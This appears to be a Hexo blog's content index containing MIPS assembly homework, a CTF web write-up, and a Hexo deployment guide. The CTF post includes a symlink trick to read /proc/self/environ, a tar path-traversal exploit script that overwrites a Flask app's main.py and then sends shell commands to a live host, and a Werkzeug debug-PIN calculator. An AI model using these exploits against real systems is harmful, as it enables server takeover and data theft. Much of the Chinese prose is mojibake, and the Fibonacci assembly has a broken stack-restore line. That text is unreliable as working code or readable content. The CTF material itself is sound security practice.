\"\n> output_msg: .asciiz \"Fibonacci sequence: \"\n> space: .asciiz \" \"\n> \n> .text\n> main:\n> \t# save $s0\n> \taddi $sp, $sp, -4\n> \tsw $s0, 0($sp)\n> \t\n>     # \"Please input n: \"\n>     li $v0, 4\n>     la $a0, input_msg\n>     syscall\n>     # get n\n>     li $v0, 5\n>     syscall\n>     move $s0, $v0\n>     \n>     # \"Fibonacci sequence: \"\n>     li $v0, 4\n>     la $a0, output_msg\n>     syscall\n> \n>     # Fibonacci\n>     li $t0, 0\n>     li $t1, 1\n>     li $t3, 0   # i = 0\n>     loop:\n>         bge $t3, $s0, done  # if i â‰¥ n, go done\n>         # print t0\n>         li $v0, 1\n>         move $a0, $t0\n>         syscall\n>         # print space\n>         li $v0, 4\n>         la $a0, space\n>         syscall\n>         add $t2, $t0, $t1   # int t2 = t0 + t1\n>         move $t0, $t1   # t0 = t1\n>         move $t1, $t2   # t1 = t2\n>         addi $t3, $t3, 1    # i ++\n>         j loop\n>     done:\n>     \taddi, $sp, $sp, 4\n>     \tlw $s0, 0($sp)\n>         li $v0, 10\n>         syscall\n> ```\n>\n> ç»æµ‹è¯•æ— è¯¯\n>\n> <img src=\"image-20221218144632739.png\">\n\n## ç¬¬ä¸‰é¢˜\n\n> è¾“å…¥nä¸ªæ•°æ®ï¼Œå¹¶é‡‡ç”¨**å†’æ³¡æ’åº**ï¼Œç„¶åè¾“å‡ºæ˜¾ç¤ºã€‚\n>\n> Cä»£ç \n>\n> ```C\n> for (int i =0; i < n - 1; i ++) {\n> \tfor (int j = 0; j < n - i - 1; j++){\n> \t\tif (arr[j] > arr[j + 1]) {\n> \t\t\tint temp = arr[j];\n> \t\t\tarr[j] = arr[j + 1];\n> \t\t\tarr[j + 1] = temp;\n> \t\t}\n> \t}\n> }\n> ```\n>\n> ç”±ä»¥ä¸ŠCä»£ç å†™å‡ºæ±‡ç¼–ä»£ç \n\n\n\n> **è§£**\n>\n> ```gas\n> # Author: è‚–ç£Š\n> # Date: 2022-12-18\n> \n> .data\n> array: .space 100\n> space: .asciiz \" \"\n> line: .asciiz \"\\n\"\n> input_msg: .asciiz \"Please input the size of array(0 ~ 25) : \"\n> array_msg: .asciiz \"Please input the array: \"\n> error_msg: .asciiz \"Error: Invalid number\"\n> before_msg: .asciiz \"Array before sorting: \"\n> after_msg: .asciiz \"Array after sorting: \"\n> \n> .text\n> main:\n>     addi $sp, $sp, -8\n>     sw $s0, 0($sp)\n>     sw $s1, 4($sp)\n>     # \"Please input the size of array(0~25): \"\n>     li $v0, 4\n>     la $a0, input_msg\n>     syscall\n>         \n>     # get n\n>     li $v0, 5\n>     syscall\n>     move $s0, $v0\n>         \n>     # check if error\n>     li $t0, 25\n>     bgt $s0, $t0, error\n>     ble $s0, $zero, error\n>         \n>     # get array\n>     # \"Please input the array: \"\n>     li $v0, 4\n>     la $a0, array_msg\n>     syscall\n>     # new line\n>     li $v0, 4\n> \tla $a0, line\n> \tsyscall\n> \tla $s1, array   # Init array\n> \tmove $t0, $s1\n> \tli $t1, 0   # int i = 0\n>         \n> \tinput_loop:\n> \t\tbge $t1, $s0, input_done    # if i â‰¥ n, go done\n> \t\tli $v0, 5\n> \t\tsyscall\n> \t\tsw $v0, 0($t0)\n> \t\taddi $t0, $t0, 4\n> \t\taddi $t1, $t1, 1\n> \t\tj input_loop\n>         \n> \tinput_done:\n> \t\t# \"Array before sorting: \"\n> \t\tli $v0, 4\n> \t\tla $a0, before_msg\n> \t\tsyscall\n> \t\tjal print_array\n> \n> \n> # Bubble sort\n> \tli $t1, 0   # int i = 0\n> \tfirst_loop:\n> \t\tbge $t1, $s0, loop1_done    # if i â‰¥ n , go done\n> \t\tli $t2, 0   # int j = 0\n> \t\tmove $t0, $s1\n> \t\t\n> \t\tsecond_loop:\n> \t\t\taddi $t3, $s0, -1   # get size - 1\n> \t\t\tsub $t3, $t3, $t1   # get size - i - 1\n> \t\t\tbge $t2, $t3, loop2_done\n> \t\t\tlw $t3, 0($t0)  # $t3 = arr[j]\n> \t\t\tlw $t4, 4($t0)  # $t4 = arr[j + 1]\n> \t\t\t# if arr[j] > arr[j + 1], swap\n> \t\t\t# else, do nothing\n> \t\t\tble $t3, $t4, swap_done\n> \t\t\tsw $t3, 4($t0)\n> \t\t\tsw $t4, 0($t0)\n> \t\t\tswap_done:\n> \t\t\taddi $t2, $t2, 1    # j ++\n> \t\t\taddi $t0, $t0, 4    # next\n> \t\t\tj second_loop\n>                 \n> \t\tloop2_done:\n> \t\t\taddi $t1, $t1, 1    # i ++\n> \t\t\tj first_loop\n>                 \n> \tloop1_done:\n> \t\t# line\n> \t\tli $v0, 4\n> \t\tla $a0, line\n> \t\tsyscall\n> \t\t# \"Array after sorting: \"\n> \t\tli $v0, 4\n> \t\tla $a0, after_msg\n> \t\tsyscall\n> \t\tjal print_array\n>                 \n>         \n> exit:\n>     lw $s0, 0($sp)\n>     lw $s1, 4($sp)\n>     addi $sp, $sp, 8\n>     li $v0, 10\n>     syscall\n>         \n> print_array:\n>     move $t0, $s1\n>     li $t1, 0   # int i = 0\n>     print_loop:\n>         bge $t1, $s0, print_done\n>         lw $t2, 0($t0)\n>         # print number\n>         li $v0, 1\n>         move $a0, $t2\n>         syscall\n>         # print space\n>         li $v0, 4\n>         la $a0, space\n>         syscall\n>         # next\n>         addi $t0, $t0, 4\n>         addi $t1, $t1, 1    # i++\n>         j print_loop\n>     print_done:\n>         jr $ra\n> \n> error:\n>     # \"Error: Invalid number\"\n>     li $v0, 4\n>     la $a0, error_msg\n>     syscall\n>     j exit\n> ```\n>\n> ç»æµ‹è¯•æ— è¯¯\n>\n> <img src=\"image-20221218163911491.png\">\n","tags":["class","cs"]},{"title":"ã€‚","url":"/2022/11/27/ã€‚/","content":"# <center>è§è¯å†å²</center>"},{"title":"NSS-6","url":"/2022/11/26/NSS-6/","content":"\n## web\n\n### check(V1)&&check(V2)\n\n```python\n# -*- coding: utf-8 -*-\nfrom flask import Flask,request\nimport tarfile\nimport os\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = './uploads'\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\nALLOWED_EXTENSIONS = set(['tar'])\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n@app.route('/')\ndef index():\n    with open(__file__, 'r') as f:\n        return f.read()\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return '?'\n    file = request.files['file']\n    if file.filename == '':\n        return '?'\n    print(file.filename)\n    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:\n        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)\n        if(os.path.exists(file_save_path)):\n            return 'This file already exists'\n        file.save(file_save_path)\n    else:\n        return 'This file is not a tarfile'\n    try:\n        tar = tarfile.open(file_save_path, \"r\")\n        tar.extractall(app.config['UPLOAD_FOLDER'])\n    except Exception as e:\n        return str(e)\n    os.remove(file_save_path)\n    return 'success'\n\n@app.route('/download', methods=['POST'])\ndef download_file():\n    filename = request.form.get('filename')\n    if filename is None or filename == '':\n        return '?'\n    \n    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    \n    if '..' in filename or '/' in filename:\n        return '?'\n    \n    if not os.path.exists(filepath) or not os.path.isfile(filepath):\n        return '?'\n    \n    with open(filepath, 'r') as f:\n        return f.read()\n    \n@app.route('/clean', methods=['POST'])\ndef clean_file():\n    os.system('/tmp/clean.sh')\n    return 'success'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True, port=80)\n```\n\nå¯¹è½¯é“¾æ¥æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œç›´æ¥éé¢„æœŸäº†\n\næƒ³ç€flaskç®—pinï¼Œå…ˆçœ‹äº†ä¸‹env\n\n```shell\nln -s /proc/self/environ 1\ntar -zcvf 1.tar 1     #-z ç”¨äºå‹ç¼©è½¯è¿æ¥\nPOSTä¸Šä¼ \n```\n<img src=\"image-20221016221716692.png\">\n\nè®¿é—®å¾—åˆ°flag\n\n### check(Revenge)\n\nä¾¥å¹¸éé¢„æœŸæ‹¿äº†ä¸ªä¸€è¡€ğŸ˜‹\n\n```python\n# -*- coding: utf-8 -*-\nfrom flask import Flask,request\nimport tarfile\nimport os\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = './uploads'\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\nALLOWED_EXTENSIONS = set(['tar'])\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n@app.route('/')\ndef index():\n    with open(__file__, 'r') as f:\n        return f.read()\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return '?'\n    file = request.files['file']\n    if file.filename == '':\n        return '?'\n\n    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:\n        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)\n        if(os.path.exists(file_save_path)):\n            return 'This file already exists'\n        file.save(file_save_path)\n    else:\n        return 'This file is not a tarfile'\n    try:\n        tar = tarfile.open(file_save_path, \"r\")\n        tar.extractall(app.config['UPLOAD_FOLDER'])\n    except Exception as e:\n        return str(e)\n    os.remove(file_save_path)\n    return 'success'\n\n@app.route('/download', methods=['POST'])\ndef download_file():\n    filename = request.form.get('filename')\n    if filename is None or filename == '':\n        return '?'\n    \n    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    \n    if '..' in filename or '/' in filename:\n        return '?'\n    \n    if not os.path.exists(filepath) or not os.path.isfile(filepath):\n        return '?'\n    \n    if os.path.islink(filepath):\n        return '?'\n    \n    if oct(os.stat(filepath).st_mode)[-3:] != '444':\n        return '?'\n    \n    with open(filepath, 'r') as f:\n        return f.read()\n    \n@app.route('/clean', methods=['POST'])\ndef clean_file():\n    os.system('su ctf -c /tmp/clean.sh')\n    return 'success'\n\n# print(os.environ)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True, port=80)\n```\n\n`os.path.islink`å¯¹è½¯é“¾æ¥è¿›è¡Œäº†é™åˆ¶ï¼Œæ²¡æ‰¾åˆ°å¯ç»•è¿‡çš„åŠæ³•(å¼€å§‹å¼‚æƒ³å¤©å¼€æƒ³ç€æ„é€ åŒå±‚taræ¥çœ‹æ–‡ä»¶ï¼Œç›´æ¥æŠ¥é”™å˜ï¼Œæ­£å¥½çœ‹åˆ°æ–‡ä»¶å**main.py**ï¼Œ**python 3.10**)\n\nä½†æ˜¯å¯ä»¥åˆ©ç”¨[**CVE-2007-4559**](https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html)é€šè¿‡æ–‡ä»¶åä¸­åŒ…å«`../`æ¥è¦†ç›–è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ä»»ä½•æ–‡ä»¶\n\n#### éé¢„æœŸ\n\nå› ä¸º**flask**åœ¨debugæ¨¡å¼å¼€å¯åä¼š**auto_reload**ï¼Œæ‰€ä»¥å¯åˆ©ç”¨æ­¤ç‰¹æ€§ï¼Œè¦†ç›–**main.py**\n\nåœ¨åŸæ¥çš„åŸºç¡€ä¸ŠåŠ ä¸ªè¿™ä¸ª\n<img src=\"image-20221016223327232.png\">\n\n**exp**\n\n```python\nimport tarfile\nimport requests\n\ndef change_name(tarinfo):\n    tarinfo.name = \"../\" + tarinfo.name\n    return tarinfo\n\nwith tarfile.open(\"exploit.tar\", \"w:xz\") as tar:\n    tar.add(\"main.py\", filter=change_name)\n    \ndef upload():\n    res = requests.post(url=url, files={\"file\": open(\"exploit.tar\", 'rb')})\n    \nurl='http://1.14.71.254:28045/upload'\nupload()\nwhile 1:\n    a=input('bash:')\n    r=requests.post(url=url+'?a='+a)\n    print(r.text)\n```\n<img src=\"image-20221016224003715.png\">\n\n#### é¢„æœŸ\n\né¢„æœŸæ˜¯åˆ©ç”¨è¦†ç›–`/tmp/clean.sh`ï¼Œç„¶åè®¿é—®`/clean` getshell\n\nç„¶åä½ ä¼šå‘ç°flagæ˜¯rootæƒé™æ‰èƒ½è¯»çš„\n\næ‰€ä»¥å°±åªèƒ½**flaskç®—pin**æ¥å¾—åˆ°rootæƒé™äº†\n\nå¸¸ç”¨åå¼¹shellçš„å‘½ä»¤éƒ½æ²¡å¼¹æˆåŠŸï¼Œä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œç›´æ¥rootæƒé™è¯»æ–‡ä»¶å§\n\nç”¨æˆ·ä¸ºè‚¯å®šä¸º**root**äº†\n\n**app.py**çš„ä½ç½®ä¸Šé¢å·²å¾—åˆ°\n<img src=\"image-20221016233634606.png\">\n\nç®—pin(**è¯¦è§ä¸Šç¯‡æ–‡ç« **)\n\n```python\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# username\n    'flask.app',# modname\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n    '2485376925239',# str(uuid.getnode()),  /sys/class/net/ens33/address\n    '96cec10d3d9307792745ec3b85c8962079be847c1c22f74bae99e457863e13fd4c60de47472f2a8d533525466d7c34de'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n            continue\n    if isinstance(bit, str):\n        bit = bit.encode(\"utf-8\")\n    h.update(bit)\nh.update(b\"cookiesalt\")\n\ncookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n\nnum = None\nif num is None:\n    h.update(b\"pinsalt\")\n    num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n\nrv=None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = \"-\".join(\n                num[x : x + group_size].rjust(group_size, \"0\")\n                for x in range(0, len(num), group_size)\n            )\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n**rce**\n\n<img src=\"image-20221016233908068.png\">\n\n","tags":["web"]},{"title":"hexoéƒ¨ç½²åœ¨Github Pages","url":"/2022/11/26/hexoéƒ¨ç½²åœ¨Github Pages/","content":"\nè®°å½•ä¸‹ç”¨hexoæ­å»ºGithub Pagesçš„è¿‡ç¨‹\n\n## å‰è¨€\n\nä¹‹å‰ä¸€ç›´éƒ½æƒ³åœ¨æœåŠ¡å™¨ä¸Šæ­å»ºä¸€ä¸ª**hexo**åšå®¢ï¼Œä½†å¯¹**node.js**å®Œå…¨ä¸ç†Ÿæ‚‰ä»¥åŠåœ¨å®å¡”é¢æ¿ä¸Šéƒ¨ç½²é™æ€åšå®¢å¥½åƒæœ‰ç‚¹éº»çƒ¦ï¼Œå°±ç®€å•çš„ç”¨**typecho**ï¼Œéšä¾¿æ‰¾äº†ä¸€ä¸ªä¸»é¢˜æ­å»ºäº†[åšå®¢](https://xlccccc.cn/)ã€‚\n\n**typecho**æ˜¯é€‚é…markdownçš„ï¼Œå°±æ˜¯æ¯ä¸ªå›¾ç‰‡éƒ½è¦ä¸Šä¼ é™„ä»¶ç„¶åæ›´æ”¹å›¾ç‰‡è·¯å¾„å¯¼è‡´æˆ‘è‡ªå·±å†™çš„mdå®Œå…¨æ²¡æœ‰å‘ä¸Šå»çš„æ¬²æœ›\n\nè€Œ**git+hexo**å°±å¾ˆæ–¹ä¾¿äº†ï¼Œå†™å®Œç›´æ¥`git push`å°±å¥½äº†ï¼Œç»„ä¼šä¹Ÿæ­£å¥½æœ‰è¿™ä¸ªä»»åŠ¡ï¼Œå°±å€Ÿæ­¤æœºä¼šå®Œæˆäº†ã€‚(~~ä¸èƒ½å†æ‹–äº†~~)\n\n## ç¯å¢ƒ\n\nUbuntu 22.04\n\n## node.js and npm\n\nNodeçš„ç¯å¢ƒé…ç½®æ¯”è¾ƒç®€å•\n\n```bash\n$ sudo apt install nodejs npm\n$ node -v\nv12.22.9\n$ npm -v\nv8.5.1\n```\n\nå®‰è£…çš„æ˜¯é•¿æœŸç‰ˆæœ¬ï¼Œæ­å»º**hexo**å·²ç»å¤Ÿç”¨äº†\n\n## git\n\n```bash\n$ sudo apt-get install git-core\n```\n\n### é€šè¿‡sshæ–¹å¼é“¾æ¥githubè´¦æˆ·\n\n```bash\n$ git config --global user.email \"example@xx.com\"\n$ git config --global user.name \"xxx\"\n#æœ¬åœ°ç”Ÿæˆå¯†é’¥\n$ ssh-keygen -b 4096 -t rsa -C \"example@xx.com\"\n#ç”Ÿæˆåå°†è¯¥å¯†é’¥åŠ å…¥åˆ°ä½ çš„sshä¸­\n$ ssh-add ~/.ssh/id_rsa\n```\n\nç„¶åæ‰“å¼€**github**\n\nè¿›å…¥**setting**é€‰æ‹©**SSH and GPG keys**ï¼Œç‚¹å‡»**New SSH key**\n\nå–ä¸€ä¸ªåˆé€‚çš„åå­—ï¼Œå¹¶å°†ç”Ÿæˆçš„**id_rsa.pub**ä¸­çš„å†…å®¹å¤åˆ¶åˆ°keyä¸­\n\n```bash\n#ä»¥sshæ–¹å¼cloneåˆ›å»ºå¥½çš„github pagesåº“\n$ git clone git@github.com:xlccccc/xlccccc.github.io.git\n```\n\næ­¤æ—¶èƒ½æ­£å¸¸`git push`å°±æ˜¯æˆåŠŸé“¾æ¥äº†\n\n(è®°å¾—æ‰“å¼€Pagesï¼Œä»¥åŠgithubå­¦ç”ŸåŒ…å¯ä»¥ç™½å«–ä¸€ä¸ª**.me**åç¼€åŸŸå)\n\n## hexo\n\n### æœ¬åœ°\n\n```bash\n#åªæœ‰rootæƒé™æ‰å®‰è£…æˆåŠŸäº†ï¼ŒåŸå› æœªçŸ¥\n$ sudo npm install -g hexo-cli\n$ hexo init blog\n$ cd blog\n$ npm install\n#é‡æ–°ç”Ÿæˆé™æ€åšå®¢çš„æ‰€æœ‰å†…å®¹\n$ hexo generate\n#é‡å¯ hexo æœ¬åœ°æœåŠ¡\n$ hexo server\n#å®‰è£…gitæ’ä»¶\n$ npm install hexo-deployer-git --save\n```\n\næ­¤æ—¶è®¿é—® https://localhost:4000 å¯ä»¥çœ‹åˆ°æœ¬åœ°åšå®¢é¡µé¢\n\n### github pages\n\nåœ¨**_config.yml**çš„æœ€åä¸€è¡Œæ·»åŠ \n\n```yaml\ndeploy:\n  type: git\n  repository: git@github.com:xlccccc/xlccccc.github.io.git\n  branch: master\n```\n\næ›´æ”¹urlä¸ºä½ çš„`github pages`\n\n```bash\n$ hexo clean\n$ hexo generate\n$ hexo deploy\n```\n\næ­¤æ—¶è®¿é—® https://xlccccc.github.io å°±å¯çœ‹åˆ°åšå®¢å•¦\n\n```bash\n$ hexo new photo \"My Gallery\"\n$ hexo generate\n$ hexo deploy\n```\n\nå¦‚æœæ”¹äº†åŸŸåï¼Œåœ¨sourceä¸‹æ–°å»ºCNAMEï¼Œå†…å®¹ä¸ºä½ çš„åŸŸå(å¦‚`xlccccc.me`)ï¼Œç„¶å`hexo generate` `hexo deploy`å³å¯\n\n","tags":["dev"]},{"title":"Hello World","url":"/2022/11/26/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]